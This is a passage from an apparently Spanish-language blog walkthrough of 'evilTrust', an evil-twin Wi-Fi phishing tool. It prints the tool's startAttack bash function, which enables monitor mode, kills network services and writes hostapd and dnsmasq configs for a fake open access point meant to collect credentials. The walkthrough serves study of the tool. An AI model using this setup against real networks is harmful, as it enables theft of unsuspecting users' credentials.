&lt;p&gt;Tal y como se puede apreciar, para el correcto funcionamiento de la herramienta, es necesario contar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnsmasq&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hostpad&lt;/code&gt; instalado. En caso de no contar con estas utilidades, evilTrust se encargará de instalar todo lo necesario para poder operar.&lt;/p&gt;

&lt;p&gt;Una vez la comprobación es realizada, se llama a la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startAttack&lt;/code&gt;, donde tal y como su nombre indica… se comienza a desplegar el ataque.&lt;/p&gt;

&lt;p&gt;Es en esta fase donde se configurarán una serie de archivos temporales necesarios para desplegar el AP, haciendo que la tarjeta de red opere en modo Router (es obligatorio que la tarjeta de red en uso acepte el &lt;strong&gt;modo monitor&lt;/strong&gt;):&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;startAttack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;credenciales&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rf&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;credenciales&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;

	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Si&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;la&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;interfaz&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;posee&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;otro&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nombre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cambiarlo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;en&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;este&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;punto&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consideramos&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;que&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;se&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llama&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wlan0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;por&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defecto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;airmon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ng&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wlan0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifconfig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xargs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\n'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0.26&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnorm&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;checker&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;checker&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;choosed_interface&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$choosed_interface&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$interface&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;checker&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;checker&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use_ssid&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use_channel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${redColour}[!] Matando todas las conexiones...${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;killall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;network&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;manager&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wpa_supplicant&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dhcpd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;interface=$choosed_interface&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;driver=nl80211&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ssid=$use_ssid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hw_mode=g&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;channel=$use_channel&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;macaddr_acl=0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;auth_algs=1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ignore_broadcast_ssid=0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;6&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;interface=$choosed_interface&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dhcp-option=3,192.168.1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dhcp-option=6,192.168.1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;server=8.8.8.8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;log-queries&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
